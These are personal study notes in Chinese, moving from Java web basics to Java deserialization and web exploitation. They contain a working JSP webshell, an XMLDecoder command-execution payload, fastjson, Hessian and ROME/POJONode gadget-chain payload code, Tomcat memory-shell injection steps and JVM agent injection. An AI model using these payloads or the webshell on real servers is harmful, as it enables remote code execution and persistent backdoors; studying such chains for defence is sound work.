### Tomcat

```java
export JAVA_OPTS='-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005'
```



Integer 缓存池

```java
Integer x = new Integer(123);
Integer y = new Integer(123);
System.out.println(x == y);    // false
Integer z = Integer.valueOf(123);
Integer k = Integer.valueOf(123);
System.out.println(z == k);   // true
```

Integer每次会新new一个    Integer.valueOf是冲缓存池里面寻找



String Pool

string在内部方法声明为final所以string不可变

```java
		String s1 = new String("aaa");
        String s2 = new String("aaa");
        System.out.println(s1 == s2);           // false   s1.equal(s2)  ture
        String s3 = s1.intern();
        String s4 = s2.intern();
        System.out.println(s3 == s4);   // true
        String s5 = "abc";
        String s6 = "abc";
        System.out.println(s5 == s6);  //true  会自动地将字符串放入 String Pool 中
```

放入string pool里面，因此 s3 和 s4 引用的是同一个字符串。

```java
String s5 = "bbb";
```

会自动存入string pool里面



#### Servlet

##### servlet创建

![image-20220317091507115](image/image-20220317091507115.png)



![image-20220317110401225](image/image-20220317110401225.png)

```java
HttpServletRequest httpServletRequest=(HttpServletRequest) servletRequest;
```

HttpServletRequest中含有getmethod方法,但是调用的是父类servletRequest，下转型



![image-20220317144938996](image/image-20220317144938996.png)

初始化init中可以获取servlet-name   init-param中param-name对应的param-value

##### servlet-InitParameter访问对象

Ctrl+H

![image-20220318095137561](image/image-20220318095137561.png)

setAttribute无法全局读取

第一个直接获取servletcontext  第二个先获取servletconfig在调用内部方法获取servletcontext



![image-20220318163353154](image/image-20220318163353154.png)

req.getParameter获取表单内容，与config不一样(获取config文件内容)



![image-20220318181335652](image/image-20220318181335652.png)

做出返回

![image-20220318181435972](image/image-20220318181435972.png)

编码问题

![image-20220318181824602](image/image-20220318181824602.png)

##### 重定向两种方式

内部转发

![image-20220319160458880](image/image-20220319160458880.png)

##### 外部转发

![image-20220319140132893](image/image-20220319140132893.png)





request.getSession()，获取回话session没有则创建

session.getId()获取sessionid

session.isNew判断是否是第一次





#### 数据库连接（Driver）

java连接数据库，导入驱动`com.mysql.jdbc.Driver()`

```
String url = "jdbc:mysql://localhost:3306/book?characterEncoding=utf8&useSSL=false&serverTimezone=UTC&rewriteBatchedStatements=true";//访问资源  test数据库
```

info为键值对，一般是用户名密码

![image-20220328180738049](image/image-20220328180738049.png)

##### 获取连接



![image-20220329141214911](image/image-20220329141214911.png)

用流读取`jdbc.properties`文件中关键信息，`driverClass`表示驱动路径`com.mysql.jdbc.Driver`需要自己导入jar包

`finally块`不管是否抛出或捕获异常 finally 块都会执行

![image-20220329141907258](image/image-20220329141907258.png)

为了保证一定执行去掉`throws Exceptions` ，加入finally    快捷键`Ctrl+shift+T`

**有关闭资源一般才去掉全局`Exception`**

##### select查询

先用next()判断是否有值，在进行下一步操作。

![](image/image-20220330134327538-1648619037438-1648619132380.png)

用一个类进行参数赋值，在读取这个类(**bean**)

![image-20220330145115438](image/image-20220330145115438.png)

记住有空方法，防止空指针   `alt+ins`

**commonSelect**

![image-20220330160818173](image/image-20220330160818173.png)



### Struts2框架

##### 运行

![image-20230203102107373](./image/image-20230203102107373.png)

第一步：请求action，那么就会经过StrutsPrepareAndExecuteFilter，这里会做两件事情，就是下面的两步

第二步：通过ActionMapping将请求中的各种数据封装起来，拿到请求中的各种参数数据，比如我们的action的名称DemoAction

第三步：给自己找一个代理对象ActionProxy，来帮助我们处理事情。注意，这个ActionProxy实际上不做任何实事的，而是指挥别人做。

第四步：ActionProxy叫ConfigManager获取struts.xml中的各种配置信息，其中struts.xml就有action的类全限定类名等信息，这样就可以通过action的名字找到其位置了。

第五步：有了actionMapping获取的请求数据和ConfigManager获取的struts.xml中的数据，就叫ActionInvacation来查找对应的action了

第六步：在找到action之前会经过一系列的拦截器，struts内部默认实现的。找到action后，就相当于我们的servlet，在其中执行一些业务代码，然后跳转到目标页面，响应回去。struts的整个过程即结束了。



##### 配置

必须在web.xml中配置过滤器，这才能走struts的框架

```java
<filter>
    <filter-name>struts2</filter-name>
    <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>
  </filter>
```

### 反射

Field[] a=c.getDeclearField()    获取全部属性，是一个数组

getDeclearField("属性名称")    获取一个类里面的指定属性  

getField("属性名称")   获取一个类里面的公有属性



getConstructor(属性类型)     c = getConstructor(String.class,int.class)   获取构造函数

c.newInstance(name,age)   获取到实例化方法对象后在进行赋值



newInstance获取无参数构造方法



### 反射（没有无参构造方法实例化）

通过reflectionFactory来反射获取

```java
ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();
    //获取Object类的构造器
Constructor<Object> constructor = Object.class.getDeclaredConstructor();
    //根据Object构造器创建一个User类的构造器
Constructor<?> constructorForSerialization = reflectionFactory
        .newConstructorForSerialization(User.class, constructor);
    constructorForSerialization.setAccessible(true);

```





### 动态代理

Proxy.newProxyInstance(ClassLoader,实例化的接口,重写的invoke方法类)

![image-20220525200502584](image/image-20220525200502584.png)

1.获取类构造器

2.获取类接口

3.反射方法

![image-20220525200437223](image/image-20220525200437223.png)

相当于动态实现了一个接口，不需要静态的去实现。



### 任意类加载

URLClassLoader 加载 file:///  http://   jar:file:///

![image-20220526175315948](image/image-20220526175315948.png)

ClassLoader.definedClass   通过字节码加载任意类  私有(通过反射调用)

![image-20220526175745178](image/image-20220526175745178.png)

Unsafe.definedClass字节码加载public类不能直接生存Spring里面可以直接生成（从私有方法中获取对象）

![image-20220526180410666](image/image-20220526180410666.png)



### 获取类

public可以直接new 来获取对象来获取类

没有public只有通过反射获取

class c = Class.forName("jar包")

c.getDeclearConstructor(type)





### URLdns

![image-20220622140244105](image/image-20220622140244105.png)

任何java版本都可以用，测有无反序列化漏洞

hashMap的readObject最后有个putVal中会对key进行hash

![image-20220622140819467](image/image-20220622140819467.png)

这里的hash函数会调用key的hashCode方法

![image-20220622140959705](image/image-20220622140959705.png)

key设置为URL类，URL有一个同名方法hashCode，就调用过来了

![image-20220622140726698](image/image-20220622140726698.png)

后面会调用URLStreamHandler中的hashCode方法，这里有个获取地址，肯定就会有url请求

![image-20220622141134973](image/image-20220622141134973.png)



### 类加载器

ClassLoader是一个抽象方法，无法获取实例，但是有一个静态方法帮助获取实例

```java
ClassLoader.getSystemClassLoader()
```

![image-20220622144101005](image/image-20220622144101005.png)

通过类加载器获取类（默认无参）

![image-20220622144242572](image/image-20220622144242572.png)

需要获取有参方法

![image-20220622144851206](image/image-20220622144851206.png)

getDeclaredConstructor获取方法，后面跟方法的参数的类型，强转，最后获取有参方法



loadClass不会实例化



protect的方法需要反射调用getDeclaredMethod



### RMI

远程类加载对象

```java
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

public class RMIServer {

 	public interface IRemoteHelloWorld extends Remote {
 		public String hello() throws RemoteException;
 }
	public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld {
 		protected RemoteHelloWorld() throws RemoteException {
 		super();
 	}
 	
 	public String hello() throws RemoteException {
 		System.out.println("call from");
 		return "Hello world";
	 }
 }
 	private void start() throws Exception {
 		RemoteHelloWorld h = new RemoteHelloWorld();
 		LocateRegistry.createRegistry(1099);
		Naming.rebind("rmi://127.0.0.1:1099/Hello", h);
 }
 	public static void main(String[] args) throws Exception {
		new RMIServer().start();
 }
}
```

先是一个借口继承Remote类   然后接口进行实现  最后绑定地址ip/port

客户端

```java
public class TrainMain {
 public static void main(String[] args) throws Exception {
 RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld)
Naming.lookup("rmi://192.168.135.142:1099/Hello");
 String ret = hello.hello();
 System.out.println( ret);
 }
}
```

lookup中寻找名字是Hello的对象进行远程调用



具体调用步骤

1.客户端在远程服务器中寻找Hello对象（第一次TCP连接建立）call数据包

2.服务器找到Hello对象后，返还ReturnData数据包，客户端进行反序列化，发现对象是一个远程的

在另外一个端口

3.与ReturnData中的地址建立连接，进行调用（第二次TCP）



0xACED 是java反序列化的数据包头



##### 后记

在XXE漏洞这里学到了一个骚东西

调用JdbcRowSetImpl这个类，会自动调用setAutoCommit这个方法

![image-20220817170556106](image/image-20220817170556106.png)

在读取结尾标签的时候

![image-20220818130402698](image/image-20220818130402698.png)

再次跟进

![image-20220818130429786](image/image-20220818130429786.png)

###### 注意

都会进入getValueObject这个函数，只不过父类不同，所执行的方法不同，第一次`<string>rmi://localhost:1099/test</string>`这个传入进来执行这一个，但是会返回一个null值

![image-20220818141043392](image/image-20220818141043392.png)

最后是在这里传入value值

![image-20220818141301773](image/image-20220818141301773.png)

后面这里是传入的ObjectElementHandler这个里面的getValueObject

中间会调用这个类，由于是只有一个东西，所以是set，调用setdataSourceName，后面将第一个字符转为大写

![image-20220818120604637](image/image-20220818120604637.png)

这个conn可以看见

![image-20220817170617255](image/image-20220817170617255.png)

直接lookup，所以后面有xxe打rmi的poc



常规的weblogic,是通过这个函数来打的

![image-20220818110350980](image/image-20220818110350980.png)

UniversalExtractor#extract

![image-20220818111614487](image/image-20220818111614487.png)

### 流操作

```java
FileOutputStream fileOutputStream = new FileOutputStream("ser.bin");
ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
objectOutputStream.writeObject(obj);
```

第一个从文件中读取流，然后放到对象流里面



```java
ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
```

字节数组流，后续需要对这个进行编码的



其实是ObjectOutputStream吧对象流传入到ByteArrayOutputStream这里面在对这里面进行编码



```java
public static void main(String[] args) throws IOException {
        InputStream whoami = new ProcessBuilder("whoami").start().getInputStream();
        byte[] bytes = new byte[2048];
        int a=0;
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        while((a= whoami.read(bytes)) >0){
            byteArrayOutputStream.write(bytes,0,a);
        }
        System.out.println(byteArrayOutputStream);
    }
}
```

第一行就直接对对象输出到流里面了

![image-20220812131912225](image/image-20220812131912225.png)

创建一个空的字节，然后将whoami这个流write到bytes中，最后把这个bytes搞到输出流里面就能看见了

```java
whoami.read(bytes)   //取长度
```

### 命令执行

Runtime

ProcessBuilder

ProcessImpl   Runtime的底层调用，不过需要反射

在windows中，命令前缀要加`cmd /c`

### CC

![CC链](image/CC链.jpg)



### JNDI

1.8_201版本太高无法信任工厂，导致无法通过JNDI的rmi远程加载类

相比较RMI多了这个

```java
InitialContext initialContext = new InitialContext();   构造一个初始上下文
```

高版本中还需要自己绑定注册中心，否者会报错



对于client中还需要继承他的借口，不然调用不到方法。

```java
rmi stub = (rmi) registry.lookup("hello");
```



Reference类

```
Reference reference = new Reference("test", "test", "http://127.0.0.1/7777");
//类名   工厂名    地址   
```

![image-20220804171647053](image/image-20220804171647053.png)

主要是这里绑定了恶意工厂，恶意类，不要写在包里面，找不到要报错

如果使用calc这个类的话，本地直接找到了，所以不能加载恶意codebase，所以要移除工程夹

![image-20220804192219113](image/image-20220804192219113.png)

在bind的时候会进行encode编程ReferenceWarpper   在lookup的时候会decode回来

![image-20220802163719516](image/image-20220802163719516.png)

没有jdk环境就直接跟着视频复现啦



最后调用loadclass，urlloadclass加载类，初始化，主要是jndi设计问题，远程类加载





### 内存马

![image-20220816132749632](image/image-20220816132749632.png)

三种listener

- ServletContext，服务器启动和终止时触发
- Session，有关Session操作时触发
- Request，访问服务时触发



第三种最适合用来做内存马=>ServletRequestListener

**requestInitialized：**在request对象创建时触发

**requestDestroyed：**在request对象销毁时触发

![image-20220816124651849](image/image-20220816124651849.png)



在这里可以看见可以动态注册filter和servlet

![image-20230322143904905](./image/image-20230322143904905.png)



最后实现是在tomcat里面的

![image-20230322144715383](./image/image-20230322144715383.png)

![image-20230322145007810](./image/image-20230322145007810.png)

最后可以看见filterDef将filterName，filterClass.getName，还有filter对象储存进去了

![image-20230322145606375](./image/image-20230322145606375.png)

使用StandardContext$addFilterDef将这个加入到filterDefs中一个hashmap

最后new了一个ApplicationFilterRegistration返回，但是没有返回到filterChain中，单纯调用这个方法不会完成自定义 Filter 的注册。并且这个方法判断了一个状态标记，如果程序以及处于运行状态中，则不能添加 Filter，所以无法动态创建一个filter

**直接操纵filterChain**

实现filterchain的在`org.apache.catalina.core.ApplicationFilterChain`这个类，里面也实现了addFilter方法，可以将传入进来的filter加入到this.filters

![image-20230322152539618](./image/image-20230322152539618.png)

但是没用，因为对于每次请求需要执行的 FilterChain 都是动态取得的。

`ApplicationFilterFactory` 的 `createFilterChain` 方法中，可以看到流程如下：

![image-20230322153742210](./image/image-20230322153742210.png)

> - 在 context 中获取 filterMaps，并遍历匹配 url 地址和请求是否匹配；
> - 如果匹配则在 context 中根据 filterMaps 中的 filterName 查找对应的 filterConfig；
> - 如果获取到 filterConfig，则将其加入到 filterChain 中
> - 后续将会循环 filterChain 中的全部 filterConfig，通过 `getFilter` 方法获取 Filter 并执行 Filter 的 `doFilter` 方法。

每次都是循环比较匹配在加入filterChain，如果我们要加入一个filter就需要在filterMaps中加入filterMap，还需要在filterConfigs中添加ApplicationFilterConfig（进行了强转）

在 StandardContext 的 `filterStart` 方法中生成了 filterConfigs。之前我们可以加入filterDef对象

![image-20230322155249294](./image/image-20230322155249294.png)

在 ApplicationFilterRegistration 的 `addMappingForUrlPatterns` 中生成了 filterMaps。

![image-20230322155403902](./image/image-20230322155403902.png)

而这两者的信息都是从 filterDefs 中的对象获取的。而filterDefs在之前说过，在addFilterDef中加入filterDefs

![image-20230322155545830](./image/image-20230322155545830.png)

所以动态加入filter思路

> - 调用 ApplicationContext 的 addFilter 方法创建 filterDefs 对象，需要反射修改应用程序的运行状态，加完之后再改回来；
> - 调用 StandardContext 的 filterStart 方法生成 filterConfigs；
> - 调用 ApplicationFilterRegistration 的 addMappingForUrlPatterns 生成 filterMaps；
> - 为了兼容某些特殊情况，将我们加入的 filter 放在 filterMaps 的第一位，可以自己修改 HashMap 中的顺序，也可以在自己调用 StandardContext 的 addFilterMapBefore 直接加在 filterMaps 的第一位。



### 内存马2（实现）

这里是HttpServlet域下，可以从`request`作用域中获取`ServletContext`对象，之后又通过ServletContext获取ApplicationContext对象，再次通过ApplicationContext获取StandardContext对象，就这样，最终的到了需要的StandardContext对象。

1.先获取ApplicationContext这个对象

```java
ServletContext servletContext = req.getSession().getServletContext();
Field appctx = servletContext.getClass().getDeclaredField("context");
appctx.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
```

req请求，可以直接获取到ServletContext，req是RequestFacade这个类，getsession获取到StandardSessionFacade这个类，通过StandardSessionFacade再次getServletContext获取到了ApplicationContextFacade这个类，类里面存放了ApplicationContext这个类，直接通过ApplicationContextFacade$getContext获取到了

![image-20230323102845920](./image/image-20230323102845920.png)

后面一步步获取到想要的类StandardContext，还有对象filterConfigs

![image-20230323103254752](./image/image-20230323103254752.png)

然后写了一个filter，重写doFilter里面加入自己的命令

![image-20230323103430383](./image/image-20230323103430383.png)

创建一个FilterDef对象，里面需要加入filter / fitlerName / filterClass，为什么要加这些东西，可以看见在ApplicationContext中addFilter动态添加的时候需要加入这些东西

![image-20230323103741036](./image/image-20230323103741036.png)

根据之前分析，还需要控制FilterConfigs和FilterMaps两个就可以了，在StandardContext$filterStart中遍历了filterDefs，一个个实例化成ApplicationFilterConfig添加到filterConfigs了，所以config这么设置

![image-20230323104302848](./image/image-20230323104302848.png)





### XML

![image-20220816174219448](image/image-20220816174219448.png)

```xml
<java version="1.7.0_80" class="java.beans.XMLDecoder">
 <object class="java.lang.ProcessBuilder">
  <array class="java.lang.String" length="1">
   <void index="0"><string>calc</string></void>
  </array>
  <void method="start">
  </void>
 </object>
</java>
```

读取结束字符`</xxx>`这种的，然后内容通过getValueObject取出来，应为是string标签，所以取到calc这个值

后面可能直接取到类，方法了

添加到父类VoidElementHandler的Argument属性中

![image-20220816174627086](image/image-20220816174627086.png)

然后反复调用，最后加入一个方法start就可以了



### 写入shell

1.echo可以写入

2.java.io.PrintWriter

![image-20220817111928195](image/image-20220817111928195.png)

shell demo

```jsp
<![CDATA[<% if("secfree".equals(request.getParameter("password"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("command")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print("</pre>"); } %>]]>
```



### XStream

对于可以序列化的，会自动调用它的readObject

```xml
<test.Person serialization="custom">
  <test.Person>
    <default>
      <age>12</age>
      <name>aaa</name>
      <workCompany serialization="custom">
        <test.Company>
          <default>
            <companyLocation>beij</companyLocation>
            <companyName>aa</companyName>
          </default>
        </test.Company>
      </workCompany>
    </default>
  </test.Person>
</test.Person>
```

```xml
<test.Person serialization="custom">
  <test.Person>
    <default>
      <age>12</age>
      <name>aaa</name>
      <workCompany>
        <companyName>aa</companyName>
        <companyLocation>beij</companyLocation>
      </workCompany>
    </default>
  </test.Person>
</test.Person>
```

```java
XStream xStream = new XStream(new DomDriver());
Person aaa = new Person("aaa", 12,new Company("aa","beij"));
String s = xStream.toXML(aaa);
System.out.println(s);
Person people1 =(Person) xStream.fromXML(s);
System.out.println(people1);
```

这种会直接调用可序列化的类的重写的readObject方法,这是CVE2021那个漏洞原理



之前的话就是被解析到恶意类上面去了



### Fastjson

```
toJSONString  自动调用get
parse   	  自动调用set
parseObject   先set在get
parseObject其实也是使用的parse方法，只是多了一步toJSON方法处理对象。
```

1. 如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用`Feature.SupportNonPublicField`参数

2. fastjson 在为类属性寻找getter/setter方法时，调用函数`com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()`方法，会忽略`_ -`字符串

3. fastjson 在反序列化时，如果Field类型为byte[]，将会调用`com.alibaba.fastjson.parser.JSONScanner#bytesValue`进行base64解码，在序列化时也会进行base64编码


1.2.24高版本，加入了黑白名单，可以直接通过这样来进行把我们所需要的类加入到白名单，然后在进行

```xml
{
         "@type": "java.lang.Class",
         "val": "com.sun.rowset.JdbcRowSetImpl"
}
```

![image-20220824151905956](image/image-20220824151905956.png)

开启`autoTypeSupport`的情况下，走到这里

![image-20220824152040912](image/image-20220824152040912.png)

deserializers里面之前放了一些类了，之前对应的Class.class，进到这里面

![image-20220824152144435](image/image-20220824152144435.png)

判断类型进入TypeUtils.loadClass

![image-20220824152252479](image/image-20220824152252479.png)

cache默认为true，然后就把这个东西put进去

![image-20220824152313328](image/image-20220824152313328.png)

后续和上面一样直接jndi就行



##### toJSONString->getter

![image-20230615151933355](./image/image-20230615151933355.png)

在这里获取到fieldInfo就获取了，未被引用的变量在这里是不会被加入的，这里是通过asm动态创建一个类，最后将这个asm传入到ASMSerializerFactory这个类里面

![image-20230615153441011](./image/image-20230615153441011.png)

判断你的数据类型进入到不同分支

![image-20230615153537818](./image/image-20230615153537818.png)

这里传入int类型进入到了分支，里面调用了_get方法

### spring bean

PropertyDescriptor是JDK自带的java.beans包下的类，意为属性描述器，用于获取符合Java Bean规范的对象属性和get/set方法

```
getWriteMethod()   set方法
getReadMethod()    get方法
```

可以通过反射来赋值

```java
userNameDescriptor.getWriteMethod().invoke(user, "bar");
```



### javaAgent

两种方法

1.只能在启动时使用`-javaagent`参数指定，一般来说不咋常用

![image-20220905103705309](image/image-20220905103705309.png)

必须实现premain方法

![image-20220905102040032](image/image-20220905102040032.png)

2.在启动过后，加入javaagent，在`META-INF/MANIFEST.MF`中加入`Agent-Class`

```
Manifest-Version: 1.0
Premain-Class: com.shiroha.demo.在jar包前执行
Agent-Class: com.shiroha.demo.jar包执行后执行
//注意多一行
```

![image-20220905114122997](image/image-20220905114122997.png)

```
import com.sun.tools.attach.AgentInitializationException;
import com.sun.tools.attach.AgentLoadException;
import com.sun.tools.attach.AttachNotSupportedException;
import com.sun.tools.attach.VirtualMachine;

import java.io.IOException;

public class AgentMain {
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {
        String id = args[0];
        String jarName = args[1];

        System.out.println("id ==> " + id);
        System.out.println("jarName ==> " + jarName);   //需要加入的agent，地址（./aaa.jar）

        VirtualMachine virtualMachine = VirtualMachine.attach(id); //通过pid进行连接到JVM
        virtualMachine.loadAgent(jarName);  //加载agent，agentmain方法
        virtualMachine.detach();

        System.out.println("ends");
    }
}
```

main函数单独放一个jar包，记得把主函数加上

![image-20220905145952872](image/image-20220905145952872.png)

如果是premain和agentmain的话就不用设置了

相当于是在一个进程里面进行注入，先运行一个jar包查看pid,然后将需要加入的jar包放在和运行jar包同一目录下执行就行

![image-20220905145549250](image/image-20220905145549250.png)

![image-20220905145544344](image/image-20220905145544344.png)



##### java agent后

```
package hack;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.util.List;

public class TestAgentMain {

    public static void main(String[] args) throws Exception {
        System.out.println("running JVM start ");
        List<VirtualMachineDescriptor> list = VirtualMachine.list();//获取所有jvm中运行的列表
        System.out.println(list);
        for (VirtualMachineDescriptor vmd : list) {

            System.out.println(vmd.displayName());
            if (vmd.displayName().endsWith("mydubbo-server.jar"))//寻找指定jar包 {
                System.out.println("helloworld");
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());//这里直接获取pid
                virtualMachine.loadAgent("/tmp/agent.jar");//load恶意agent
                virtualMachine.detach();
            }
        }
    }
}
```



##### Instrumentation

getAllLoadedClasses：获取所有已经加载的类。

isModifiableClasses：判断某个类是否能被修改。



##### 内存马

ApplicationFilterChain#doFilter这个方法，会处理传进来的get post方法，如果将这里面的内容进行修改恶意类，即可成功执行



### dubbo反序列化

类似于rmi（其实更接近jrmp），只不过中间的服务器使用的是zookeeper，里面还有tomcat，可能会和jetty端口冲突，改一下jetty的端口就好了

成功过后（客户端可以直接获取到服务端的类，这个类是在xml文件中绑定的，然后直接调用）

![image-20220913140331717](image/image-20220913140331717.png)

服务端（红色部分是tomcat的，客户端打印出，服务端也会打印，记得对应的org.apache.curator这个要对应版本，不然就是一直重新连接）

![image-20220913140521594](image/image-20220913140521594.png)

利用hessian协议

![image-20220914111321581](image/image-20220914111321581.png)

这里直接调用hashmap的put，hashcode->rome链，这里是用JDBC的链子（网上很多错的，调用方法就应该是这里）

如果用Tem的链子的话这里会爆空指针，_tfactory为空，他的定义是无法被序列化的，所以这里进行正反序列化传入不进去这个值，导致null

```
private transient TransformerFactoryImpl _tfactory = null;
```

![image-20220914104818736](image/image-20220914104818736.png)

而cc2中可以正反序列化是应为在他的readobject，new了一个新的，相当于不是调用同一个readobject

![image-20220914105050954](image/image-20220914105050954.png)

在这里循环调用getter方法，最后到我们的getDatabaseMetaData这里来

![image-20220914110317218](image/image-20220914110317218.png)

想要使用Tem这条链子就得在返序列化的时候对Templ这个的readObject进行调用

二次反序列化SignedObject这个的getObject（getter）中调用了

![image-20220914171226125](image/image-20220914171226125.png)

这里是将这个SignedObject封装进tostringbean，然后调用getter方法，调用了Templ的readObject，进行了赋值，最后在对SignedObject里面的toStringbean进行调用tostring，最后成功

BadAttributeValueExpException这个会调用里面的readObject方法



##### Hessian only idk

用jdbc这个链子的话感觉只有fastjson，应为要设置setAutoCommit这个东西，本地无法生存payload

所以后面看到这个链子

**1.任意文件写**

用的是JavaUtils#writeBytesToFilename

```java
public class writefile {
    public static void main(String[] args) throws Exception {
        String a="hahah";
        byte[] bytes = a.getBytes(); //文件的数据
        String filename="/tmp/success";//文件路径
        Class<JavaUtils> javaUtilsClass = JavaUtils.class;
        Method writeBytesToFilename = javaUtilsClass.getDeclaredMethod("writeBytesToFilename",String.class,byte[].class);
        writeBytesToFilename.setAccessible(true);
        writeBytesToFilename.invoke(javaUtilsClass,"/tmp/1111",bytes);
    }
}
```

后面在这里ProxyLazyValue#createValue中找到调用任意任意public类的public static修饰的方法

```java
public static void main(String[] args) throws Exception {
        String a="hahah";
        byte[] bytes = a.getBytes(); //文件的数据
        String filename="/tmp/success";//文件路径

        UIDefaults uiDefaults = new UIDefaults();
        UIDefaults.ProxyLazyValue proxyLazyValue = new UIDefaults.ProxyLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils","writeBytesToFilename", new Object[]{filename,bytes});
        proxyLazyValue.createValue(uiDefaults);  //createValue这个方法会调用任意public类的public static修饰的方法

    }
```

完整

```java
public static void main(String[] args) throws Exception {
        String a="hahah";
        byte[] bytes = a.getBytes(); //文件的数据
        String filename="/tmp/success";//文件路径

        UIDefaults uiDefaults = new UIDefaults();
        UIDefaults.ProxyLazyValue proxyLazyValue = new UIDefaults.ProxyLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils","writeBytesToFilename", new Object[]{filename,bytes});
//        proxyLazyValue.createValue(uiDefaults);  //createValue这个方法会调用任意public类的public static修饰的方法
        uiDefaults.put("fff",proxyLazyValue);

        Class clazz = Class.forName("java.awt.datatransfer.MimeTypeParameterList");

        Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafe.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafe.get(null);
        Object obj = unsafe.allocateInstance(clazz);

        Field parameters = clazz.getDeclaredField("parameters");
        parameters.setAccessible(true);
        parameters.set(obj,uiDefaults);

        obj.toString();
    }
```



换了一条链子PKCS9Attributes#toString一样的

```java
public static void main(String[] args) throws Exception {
        String a="hahah";
        byte[] bytes = a.getBytes(); //文件的数据
        String filename="/tmp/success";//文件路径

        UIDefaults uiDefaults = new UIDefaults();
        UIDefaults.ProxyLazyValue proxyLazyValue = new UIDefaults.ProxyLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils","writeBytesToFilename", new Object[]{filename,bytes});
//        proxyLazyValue.createValue(uiDefaults);  //createValue这个方法会调用任意public类的public static修饰的方法
        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID,proxyLazyValue);//EMAIL_ADDRESS_OID放在这里，应为后面是在存有这个值的数组中匹配

        PKCS9Attributes pkcs9Attributes = createWithoutConstructor(PKCS9Attributes.class);
        Class<?> aClass = Class.forName("sun.security.pkcs.PKCS9Attributes");
        Field attributes = aClass.getDeclaredField("attributes");
        attributes.setAccessible(true);
        attributes.set(pkcs9Attributes,uiDefaults);
  			pkcs9Attributes.toString();
}
```

两个链子有同一问题，都没继承serlize，设置序列化的时候不需要Serializable这个接口

```java
output.getSerializerFactory().setAllowNonSerializable(true);
```

但是我还是没成功



### ROME

hashmap的readobject入口->hashcode->Tostringbean#hashcode->toString(任意get调用)->getOutputProperties->newTransformer->getTransletInstance->newInstance

调用tostring另一种方法就是

BadAttributeValueExpException这个类的readobject中含有tostring方法    cc5



**这里说一下**

在dubbo里面，特定的readobject导致无法使用；

![image-20221014100424910](image/image-20221014100424910.png)



### 二次反序列化

SignedObject读取了一个readObject的字节码，然后在SignedObject的有个getter里面将读取的字节码转换一个ObjectInputStream然后调用这个流的readObejct  (hessian)



### CB链

sink：在这里会自动调用property的getter

![image-20220920113614584](image/image-20220920113614584.png)

property需要设置

```
BeanComparator beanComparator = new BeanComparator("outputProperties");
```

最后反序列化是PriorityQueue这个类

![image-20220920113745882](image/image-20220920113745882.png)

queue里面放调用数组

size也需要赋值，不让进不了判断



### Groovy

可以执行字符串

```java
GroovyShell groovyShell = new GroovyShell();
String cmd = "\"calc\".execute().text";
System.out.println(groovyShell.evaluate(cmd)); 
```

也可以执行.groovy脚本，也可以开启http的服务然后执行

```java
File file = new File("C:\\Users\\admin\\Desktop\\project\\cc\\src\\main\\java\\groovy\\script.groovy");
groovyShell.evaluate(file);
```

也可以进行类加载，然后反射调用实现GroovyClassLoader.parseClass(也可从文件中进行类加载)

![image-20220922134055024](image/image-20220922134055024.png)

javax.script.ScriptEngine 想必都熟悉，我们可以使用他来执行js脚本，当然也可以执行groovy 脚本。

```java
ScriptEngine scriptEngine = new ScriptEngineManager().getEngineByName("groovy/javascript");
System.out.println(scriptEngine.eval("\"whoami\".execute().text"));
```

一般这样写

```java
MethodClosure methodClosure = new MethodClosure("calc", "execute");
methodClosure.call();
```



### POJONode->getter

```java
byte[] code= Files.readAllBytes(Paths.get("/Users/f1or/project/cc/target/classes/calc.class"));
        byte[][] codes={code};
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_bytecodes",codes);
        setFieldValue(templates,"_name","aaa");
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject((Serializable) templates, kp.getPrivate(), Signature.getInstance("DSA"));

        POJONode jsonNodes = new POJONode(signedObject);


        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        //反射设置 val
        Field val = BadAttributeValueExpException.class.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException, jsonNodes);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
        objectOutputStream.writeObject(badAttributeValueExpException);
        System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));
```

调用tostring的时候直接就getter了，具体哪里实现没看（done）

不过要记得修改class文件，要把 [BaseJsonNode.class](../../../../Volumes/[C] Windows 11.hidden/Users/f1or/Desktop/BaseJsonNode.class) 覆盖下



### JVM

1.JRE(Java Runtime Environment)，java平台，所有的程序都得在这个平台下面运行

2.JDK(Java Development Kit)，用来调试，编译java程序的开发工具包，还自带有内置库。和工具javac这些

